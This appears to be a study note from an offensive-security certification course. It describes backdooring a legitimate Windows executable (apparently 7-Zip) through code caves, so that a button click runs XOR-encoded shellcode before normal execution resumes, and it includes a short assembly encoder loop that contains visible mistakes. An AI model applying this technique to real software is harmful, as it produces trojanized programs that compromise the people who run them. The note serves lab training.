Building on: https://github.com/securityELI/CTP-OSCE/blob/master/backdoorPE/User-Interaction%2BCodecaves

Overview:
1 - Start of program execution
2 - Legimiate functionality
3 - User clicks on web adddr button
4 - Code Cave 2 (CC2) Encoder/Decodes shellcode
5 - Code Cave 1 (CC1) Executes shelllcode
6 - Jumps back to normal execution (#3)
-----------------------------

- Hijack execution flow to jump to CC2.
- Save modifications as a file on disk.

- Now that we are in CC2. before writing our XOR encoder here, 
- we will firstly jump to starting address of CC1 and implant our shellcode 
so that we get the accurate addresses that we have to use in XOR encoder.

PUSH ECX, 00477857               // Push the starting address of shellcode to ECX.
XOR BYTE PTR DS:[EAX],0B         // Exclusive OR the contents of ECX with key 0B
INC ECX                          // Increase ECX to move to next addresses
CMP ECX,0047799B                 // Compare ECX with the ending address of shellcode
JLE SHORT 00479733               // If they are not equal, take a short jump back to address of XOR operation
JMP 7zFM2.00477857               // if they are equal jump to the start of shellcode


As we are encoding the opcodes in CC1, we have to make sure the header section in which the CC1 
resides is writeable otherwise Ollydbg will show access violation error. 
